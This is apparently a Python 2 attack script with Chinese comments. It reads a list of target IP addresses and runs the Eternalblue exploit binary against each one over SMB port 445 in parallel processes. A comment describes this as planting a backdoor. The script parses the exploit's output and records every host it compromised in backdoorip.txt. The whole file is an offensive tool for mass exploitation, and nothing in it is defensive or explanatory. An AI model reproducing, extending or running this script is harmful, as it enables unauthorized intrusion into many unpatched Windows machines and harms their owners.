# -*- coding: utf-8 -*-

import os,time
import multiprocessing
from multiprocessing import Pool

def back_door(ip):
    #获取当前路径
    path =  str(os.getcwd())
    #开始445植入后门程序
    fp = os.popen(path + "\\windows\\Eternalblue-2.2.0.exe --InConfig " + path + "\\windows\\Eternalblue-2.2.0.xml" + " --TargetIp " + ip)
    #运行后的值是以 file read形式保存的
    s = fp.read()
    #返回运行结果
    if 'configversion="2.2.0.0" name="Eternalblue" version="2.2.0" schemaversion="2.1.0"' in s:
        result = 1
    else:
        result = 0
    return result

def ip_list(q):
    path = str(os.getcwd())
    ip = open(path + "\\iplist.txt", "r")
    for line in ip:
        line = line.strip("\n")
        q.put(str(line))
    return q

def backdoor(q,result):
    print 'Run task  (%s)...' % (os.getpid())
    path = str(os.getcwd())
    ip = q.get_nowait()
    res = back_door(ip)
    if res == 1:
        os.system("echo " + str(ip) + " >> " + path + "\\backdoorip.txt")
        result.put('status:Success! ' + str(ip))
    else:
        result.put('status: fail!' + str(ip))

#循环监控返回队列有无数据
def re(result,wait):
    while wait != 0:
        time.sleep(1)
        if result.empty() != True:
            print result.get()
            wait-=1

if __name__=='__main__':
    #global que
    manager = multiprocessing.Manager()
    q = manager.Queue()
    result = manager.Queue()
    q = ip_list(q)
    wait = q.qsize()
    print 'Parent process %s.' % os.getpid()
    p = Pool(3)
    p.apply_async(re, args=(result,wait,))
    for x in range(q.qsize()):
        p.apply_async(backdoor,args=(q,result,))
    print 'Waiting for all subprocesses done...'
    p.close()
    p.join()
    print 'All subprocesses done.'

